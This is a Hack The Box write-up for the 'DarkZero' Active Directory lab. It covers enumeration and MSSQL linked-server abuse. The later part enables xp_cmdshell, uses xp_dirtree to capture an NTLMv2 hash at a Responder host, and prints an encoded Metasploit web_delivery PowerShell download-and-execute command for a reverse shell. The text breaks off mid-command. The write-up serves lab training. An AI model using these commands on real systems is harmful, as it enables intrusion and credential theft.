---
title: DarkZero [Hard]
date: 2025-10-07
tags: [htb, windows, ]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/darkzero-htb-season9
image: /assets/img/darkzero-htb-season9/darkzero-htb-season9_banner.png
---

# DarkZero HTB Season 9
## Machine information
As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w` / `RFulUtONCOL!`. <br>
Author: [0xEr3bus](https://app.hackthebox.com/users/606891)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.121.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 11:23 EDT
Nmap scan report for 10.129.121.112
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 22:23:48Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.121.112:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.121.112:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2025-10-05T22:25:18+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-05T22:19:55
|_Not valid after:  2055-10-05T22:19:55
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-05T22:24:38
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.63 seconds
```

So what we got from this one: <br>
- Domain: darkzero.htb
- DC: DC01.darkzero.htb
- Clock Skew is +7 hours

Let's add these to `/etc/hosts` file:
```bash
10.129.121.112     darkzero.htb DC01.darkzero.htb
```

### DNS (53)
We notice there is port `53` so we gonna do some enum to see that if it reveals domain structure without authentication.

```bash
└─$ dig @10.129.121.112 darkzero.htb ANY

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.129.121.112 darkzero.htb ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42049
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;darkzero.htb.                  IN      ANY

;; ANSWER SECTION:
darkzero.htb.           600     IN      A       172.16.20.1
darkzero.htb.           600     IN      A       10.129.121.112
darkzero.htb.           3600    IN      NS      dc01.darkzero.htb.
darkzero.htb.           3600    IN      SOA     dc01.darkzero.htb. hostmaster.darkzero.htb. 520 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.darkzero.htb.      1200    IN      A       10.129.121.112

;; Query time: 421 msec
;; SERVER: 10.129.121.112#53(10.129.121.112) (TCP)
;; WHEN: Mon Oct 06 06:20:48 EDT 2025
;; MSG SIZE  rcvd: 155
```

From the DNS Query we got: <br>
- `172.16.20.1` is the internal ip that we can not reach from the outside
- `10.129.121.112` is the external ip as we can access publicly
&rarr; This one give us some info that this machine may have more than 1 DC and DC01 is the primary one, so chance there maybe using some techniques to pivot to other Domain Controller.

### SMB (139,445)
Next up, we gonna do some enum around smb to see if we can found anything useful.

```bash
└─$ sudo nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb        
SMB         10.129.121.112  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.129.121.112  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```

And forgot to mention that we have been provided creds so quickly checking if it works. <br>
&rarr; So we see it verified so let's enum some users.

```bash
└─$ sudo nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --users
SMB         10.129.121.112  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.129.121.112  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.121.112  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.121.112  445    DC01             Administrator                 2025-09-10 16:42:44 0       Built-in account for administering the computer/domain 
SMB         10.129.121.112  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.121.112  445    DC01             krbtgt                        2025-07-29 11:40:16 0       Key Distribution Center Service Account 
SMB         10.129.121.112  445    DC01             john.w                        2025-07-29 15:33:53 0        
SMB         10.129.121.112  445    DC01             [*] Enumerated 4 local users: darkzero
```

We got `Administrator` as our goal for this machine, `Guest`, `krbtgt` and `john.w`. <br>
So definitely nothing much to concern so we keep up for smb shares.

```bash
└─$ sudo nxc smb dc01.darkzero.htb -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --shares
SMB         10.129.121.112  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False) 
SMB         10.129.121.112  445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL! 
SMB         10.129.121.112  445    DC01             [*] Enumerated shares
SMB         10.129.121.112  445    DC01             Share           Permissions     Remark
SMB         10.129.121.112  445    DC01             -----           -----------     ------
SMB         10.129.121.112  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.121.112  445    DC01             C$                              Default share
SMB         10.129.121.112  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.121.112  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.121.112  445    DC01             SYSVOL          READ            Logon server share
```

Okay, so we find accessible shares with current creds. <br>
&rarr; We gonna check out `NETLOGON` as the login scripts and `SYSVOL` as the Group Policies cause these two we can only have permission to access. One with `$` is not accessible.

```bash
└─$ smbclient //10.129.121.112/NETLOGON -U "darkzero.htb/john.w%RFulUtONCOL\!"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 29 07:39:08 2025
  ..                                  D        0  Tue Jul 29 07:45:53 2025

                7632895 blocks of size 4096. 1528200 blocks available
```

So nothing much with `NETLOGON`, heading to `SYSVOL`.

```bash
└─$ smbclient //10.129.121.112/SYSVOL -U "darkzero.htb/john.w%RFulUtONCOL\!"  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 29 07:39:08 2025
  ..                                  D        0  Tue Jul 29 07:39:08 2025
  darkzero.htb                       Dr        0  Tue Jul 29 07:39:08 2025

                7632895 blocks of size 4096. 1528197 blocks available
smb: \> cd darkzero.htb
smb: \darkzero.htb\> dir
  .                                   D        0  Tue Jul 29 07:45:53 2025
  ..                                  D        0  Tue Jul 29 07:39:08 2025
  DfsrPrivate                      DHSr        0  Tue Jul 29 07:45:53 2025
  Policies                            D        0  Tue Jul 29 07:39:19 2025
  scripts                             D        0  Tue Jul 29 07:39:08 2025

                7632895 blocks of size 4096. 1528197 blocks available
smb: \darkzero.htb\> cd DfsrPrivate\
cd \darkzero.htb\DfsrPrivate\: NT_STATUS_ACCESS_DENIED
smb: \darkzero.htb\Policies\> dir
  .                                   D        0  Tue Jul 29 07:39:19 2025
  ..                                  D        0  Tue Jul 29 07:45:53 2025
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Tue Jul 29 07:39:19 2025
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Tue Jul 29 07:39:19 2025

                7632895 blocks of size 4096. 1528195 blocks available
```

Reason for checking this is that this one related to Group Policy Preferences (GPP) that it often contain passwords that has weak encrypted so we can easily decrypted with some tools related. <br>
&rarr; But seems like we can not found any `.xml` files that contain passwords so we gonna enum next port.

### RPC (135, 593)
So firstly just list out the users and groups.

```bash
└─$ rpcclient -U "darkzero.htb/john.w%RFulUtONCOL\!" 10.129.121.112
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[john.w] rid:[0xa2b]
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[Forest Trust Accounts] rid:[0x210]
group:[External Trust Accounts] rid:[0x211]
group:[DnsUpdateProxy] rid:[0x44e]
```

These RID values we can use to go details specific on it via `querygroupmem` and `queryuser`.

```bash
group:[Forest Trust Accounts] rid:[0x210] ⭐
```

This one pop up and we know there is some trust relationship here. <br>
&rarr; So we checking for the member of this group.

```bash
rpcclient $> querygroupmem 0x210
        rid:[0xa2a] attr:[0x7]
```

RID `0xa2a` is member of Forest Trust Accounts. <br>
&rarr; To know the user of this RID values belongs to, we check it `queryuser`.

```bash
rpcclient $> queryuser 0xa2a
        User Name   :   darkzero-ext$
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 19:00:00 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Mon, 29 Sep 2025 14:25:18 EDT
        Password can change Time :      Tue, 30 Sep 2025 14:25:18 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0xa2a
        group_rid:      0x210
        acb_info :      0x00000044
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

So `darkzero-ext$` is trust account for external domain.

```bash
darkzero.htb (main domain)
    ↕ Trust
darkzero-ext (external domain)
```

And also there is another tool we can use to automate for us is `impacket-lookupsid` as it will brute-force RIDs to find the hidden accounts and discover all RIDs.

```bash
└─$ impacket-lookupsid darkzero.htb/john.w:'RFulUtONCOL!'@10.129.121.112
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.121.112
[*] StringBinding ncacn_np:10.129.121.112[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1152179935-589108180-1989892463
498: darkzero\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: darkzero\Administrator (SidTypeUser)
501: darkzero\Guest (SidTypeUser)
502: darkzero\krbtgt (SidTypeUser)
512: darkzero\Domain Admins (SidTypeGroup)
513: darkzero\Domain Users (SidTypeGroup)
514: darkzero\Domain Guests (SidTypeGroup)
515: darkzero\Domain Computers (SidTypeGroup)
516: darkzero\Domain Controllers (SidTypeGroup)
517: darkzero\Cert Publishers (SidTypeAlias)
518: darkzero\Schema Admins (SidTypeGroup)
519: darkzero\Enterprise Admins (SidTypeGroup)
520: darkzero\Group Policy Creator Owners (SidTypeGroup)
521: darkzero\Read-only Domain Controllers (SidTypeGroup)
522: darkzero\Cloneable Domain Controllers (SidTypeGroup)
525: darkzero\Protected Users (SidTypeGroup)
526: darkzero\Key Admins (SidTypeGroup)
527: darkzero\Enterprise Key Admins (SidTypeGroup)
528: darkzero\Forest Trust Accounts (SidTypeGroup)
529: darkzero\External Trust Accounts (SidTypeGroup)
553: darkzero\RAS and IAS Servers (SidTypeAlias)
571: darkzero\Allowed RODC Password Replication Group (SidTypeAlias)
572: darkzero\Denied RODC Password Replication Group (SidTypeAlias)
1000: darkzero\DC01$ (SidTypeUser)
1101: darkzero\DnsAdmins (SidTypeAlias)
1102: darkzero\DnsUpdateProxy (SidTypeGroup)
2601: darkzero\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
2602: darkzero\darkzero-ext$ (SidTypeUser)
2603: darkzero\john.w (SidTypeUser)
```

```bash
2602: darkzero-ext$ (SidTypeUser) ⭐⭐⭐
2601: SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias) ⭐
```

So this could be a key for exploits `unconstrained delegation` later on. <br>
And also sql server as confirm that there is service account exists so we can do MSSQL attack vector that from `nmap` result we saw port `1433` open.

### Kerberos (88)
Up next we doing some verify within this port.

First is check for Kerberos pre-auth (AS-REP Roasting).

```bash
└─$ cat users.txt         
Administrator
Guest
john.w
darkzero-ext$
```

```bash
└─$ impacket-GetNPUsers darkzero.htb/ -dc-ip 10.129.121.112 -usersfile users.txt -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
[-] User john.w doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkzero-ext$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

So all users safe that all require pre-authentication. <br>
&rarr; Let's check for SPNs service so that we can request TGS tickets got crackable hash.

```bash
└─$ impacket-GetUserSPNs darkzero.htb/john.w:'RFulUtONCOL!' -dc-ip 10.129.121.112 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

As the result, there is nothing. <br>
&rarr; Moving on to some bloodhound collections so that we can uncover more stuffs.

### LDAP/LDAPs (389, 636, 3268, 3269)
```bash
└─$ bloodhound-python -c All -u john.w -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.121.112 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
<GOT ERROR>
```

Not sure like what we got some issues. <br>
&rarr; Find out really cool stuffs that call [powerview.py](https://github.com/aniqfakhrul/powerview.py) which is the new version of `PowerView.ps1` but we have interative session without using ldap instead.

```bash
└─$ powerview darkzero.htb/john.w:'RFulUtONCOL!'@10.129.101.38                                       
/home/kali/.local/share/uv/tools/powerview/lib/python3.13/site-packages/impacket/examples/ntlmrelayx/attacks/__init__.py:20: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Logging directory is set to /home/kali/.powerview/logs/darkzero-john.w-10.129.101.38
╭─LDAPS─[DC01.darkzero.htb]─[darkzero\john.w]-[NS:10.129.101.38]
╰─PV ❯
```

So we gonna check for Unconstrained delegation as we identified that is machine have trust relationship so we need to check it out and if it vulnerable, we can abuse it to escalate to Domain Admin.

> *To udnerstand and have a explaination about this one, check out [unconstrained-delegation-abuse](https://www.thehacker.recipes/ad/movement/trusts/#unconstrained-delegation-abuse).*

```bash
╭─LDAPS─[DC01.darkzero.htb]─[darkzero\john.w]-[NS:10.129.101.38]
╰─PV ❯ Get-DomainComputer -Unconstrained
objectClass                       : top
                                    person
                                    organizationalPerson
                                    user
                                    computer
cn                                : DC01
distinguishedName                 : CN=DC01,OU=Domain Controllers,DC=darkzero,DC=htb
instanceType                      : 4
name                              : DC01
objectGUID                        : {fcaaece7-ea3a-483f-b52c-4ddae3e3251a}
userAccountControl                : SERVER_TRUST_ACCOUNT
                                    TRUSTED_FOR_DELEGATION
badPwdCount                       : 0
badPasswordTime                   : 01/01/1601 00:00:00 (424 years, 9 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 06/10/2025 13:40:53 (today)
pwdLastSet                        : 29/07/2025 11:40:16 (2 months, 6 days ago)
primaryGroupID                    : 516
objectSid                         : S-1-5-21-1152179935-589108180-1989892463-1000
logonCount                        : 432
sAMAccountName                    : DC01$
sAMAccountType                    : SAM_MACHINE_ACCOUNT
operatingSystem                   : Windows Server 2025 Datacenter
dNSHostName                       : DC01.darkzero.htb
servicePrincipalName              : Hyper-V Replica Service/DC01
                                    Hyper-V Replica Service/DC01.darkzero.htb
                                    Microsoft Virtual System Migration Service/DC01
                                    Microsoft Virtual System Migration Service/DC01.darkzero.htb
                                    Microsoft Virtual Console Service/DC01
                                    Microsoft Virtual Console Service/DC01.darkzero.htb
                                    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.darkzero.htb
                                    ldap/DC01.darkzero.htb/ForestDnsZones.darkzero.htb
                                    ldap/DC01.darkzero.htb/DomainDnsZones.darkzero.htb
                                    DNS/DC01.darkzero.htb
                                    GC/DC01.darkzero.htb/darkzero.htb
                                    RestrictedKrbHost/DC01.darkzero.htb
                                    RestrictedKrbHost/DC01
                                    RPC/e78dbc40-94c4-44f5-8ee6-f8bb6b21f3dd._msdcs.darkzero.htb
                                    HOST/DC01/darkzero
                                    HOST/DC01.darkzero.htb/darkzero
                                    HOST/DC01
                                    HOST/DC01.darkzero.htb
                                    HOST/DC01.darkzero.htb/darkzero.htb
                                    E3514235-4B06-11D1-AB04-00C04FC2DCD2/e78dbc40-94c4-44f5-8ee6-f8bb6b21f3dd/darkzero.htb
                                    ldap/DC01/darkzero
                                    ldap/e78dbc40-94c4-44f5-8ee6-f8bb6b21f3dd._msdcs.darkzero.htb
                                    ldap/DC01.darkzero.htb/darkzero
                                    ldap/DC01
                                    ldap/DC01.darkzero.htb
                                    ldap/DC01.darkzero.htb/darkzero.htb
objectCategory                    : CN=Computer,CN=Schema,CN=Configuration,DC=darkzero,DC=htb
lastLogonTimestamp                : 02/10/2025 18:33:13 (3 days ago)
msDS-SupportedEncryptionTypes     : RC4-HMAC
                                    AES128
                                    AES256
vulnerabilities                   : [VULN-005] Account has unconstrained delegation enabled (HIGH)
```

As result, it mark `HIGH` severity so that both DCs vulnerable to TGT capture. <br>
Therefore, we need to have some footage inside so we can discover more. <br>
&rarr; From the `nmap`, we saw port `1433` open so we gonna auth inside this service.

### MSSQL (1433)
```bash
└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.121.112 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

So we are in as `guest` role, let's do some recons or enum to check like: <br>
- Is `xp_cmdshell` is enable so we can use to reverse shell for further discovery or even pivoting as we know there is another DC.
- Also check for linked servers.

```bash
SQL (darkzero\john.w  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

So as expected, `guest` role does not have permission for this `xp_cmdshell`.

```bash
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

Found out `DC02.darkzero.ext` linked server exists. And `dc01_sql_svc` can remote into it so change for privilege escalation opportunity. <br>
&rarr; Now we gonna switch to `DC02` so that whenever we doing, we will execute as `dc01_sql_svc`.

```bash
SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
```

Okay now just enable `xp_cmdshell`.

```bash
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

We are now either execute commands, dump credentials and pivoting. <br>
&rarr; So we gonna try MSSQL UNC Path Injection which is stealing NTLM hash and see if we can crack it out.

```bash
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.30]
    Responder IPv6             [dead:beef:4::101c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-C3PVFUSRX2Q]
    Responder Domain Name      [7C3R.LOCAL]
    Responder DCE-RPC Port     [49012]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

Setup our `responder` and back to SQL to execute `xp_dirtree` to capture hash.

```bash
SQL (darkzero\john.w  guest@master)> EXEC ('EXEC xp_dirtree ''\\10.10.16.30\share'';') AT [DC02.darkzero.ext];
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.121.112
[SMB] NTLMv2-SSP Username : darkzero-ext\svc_sql
[SMB] NTLMv2-SSP Hash     : svc_sql::darkzero-ext:2046da3fc272e5f9:8025F98A798D4A2C0169964BBE93FCB8:0101000000000000801C8B948436DC014F2957E159C002A10000000002000800370043003300520001001E00570049004E002D004300330050005600460055005300520058003200510004003400570049004E002D00430033005000560046005500530052005800320051002E0037004300330052002E004C004F00430041004C000300140037004300330052002E004C004F00430041004C000500140037004300330052002E004C004F00430041004C0007000800801C8B948436DC0106000400020000000800300030000000000000000000000000300000304011BF826DEA4D120F93AD555C03A658B8F7EC678F845B5C9D1F741CD31A5B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
```

BOOM! Got our hash for `svc_sql`. <br>
&rarr; Let's crack it out.

```bash
└─$ hashcat -m 5600 svc_sql.hash /usr/share/wordlists/rockyou.txt --force
```

Waiting for few minutes got no result so seems like uncrackable. <br>
So we moving on to reverse shell and there is some of these concept [powershell-for-pentester-windows-reverse-shell](https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/) that we could try or simply using [revshells](https://www.revshells.com/) which they draft for us and we just use them. <br>

&rarr; Trying some concepts and it still get download but can not get reverse shell when executing so we going with `Web_Delivery` in `msfconsole`.

```bash
└─$ sudo msfconsole -q
[*] Starting persistent handler(s)...
msf > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set LHOST 10.10.16.30
LHOST => 10.10.16.30
msf exploit(multi/script/web_delivery) > set LPORT 4444
LPORT => 4444
msf exploit(multi/script/web_delivery) > set target 2
target => 2
msf exploit(multi/script/web_delivery) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.16.30:4444 
[*] Using URL: http://10.10.16.30:8080/2zhss8
[*] Server started.
[*] Run the following command on the target machine:
msf exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABtAGIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbQBiAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbQBiAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAMAAvADIAegBoAHMAcwA4AC8AWgBIADAAUAA0AFoAeABFAFgAZgB5AFUAJwApACkAOwBJAEUAWA